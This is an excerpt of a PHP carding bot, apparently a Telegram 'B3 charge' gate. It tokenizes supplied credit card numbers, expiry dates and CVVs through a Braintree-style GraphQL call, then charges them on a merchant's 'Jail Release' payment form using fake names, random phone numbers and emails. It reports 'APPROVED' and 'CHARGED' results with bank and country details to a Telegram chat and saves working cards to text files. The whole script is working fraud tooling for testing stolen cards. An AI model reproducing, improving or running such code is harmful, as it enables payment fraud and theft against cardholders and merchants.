...
#----------------------------------------------------------------------#
#   GATE: B3 CHARGE (AMOUNT = $10 OR Above)                            #
...
echo "<br><b>BIN: </b> $bindata1<br><br>";
...
echo "<br><b>Result1: </b> $ctoken<br>";
echo "<br><b>token: </b> $bearer<br><br>";
...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"'.$name.' '.$last.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$res2 = curl_exec($ch);
curl_close($ch);
$token = trim(strip_tags(getStr($res2,'"token":"','"')));

echo "<br><b>Result2: </b> $res2<br>";
...
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'office_location=0&client-first-name='.$name.'&client-last-name='.$last.'&phone=917446'.rand(1111,9999).'&email='.urlencode($email).'&amount=5&payType=Jail+Release&payment_method_nonce='.$token.'');
$res3 = curl_exec($ch);
...
//echo "<br><b>Result3: </b> $res3<br>";
echo "<br><b>MSG: </b> $msg<br><br>";
echo "<br><b>Result3: </b><br><br>";
echo htmlentities($res3);
...
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CHARGED $10</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>Your payment was approved.</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('save/b3_ccc.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
...
sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('save/new_insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
...
sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('save/new_ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
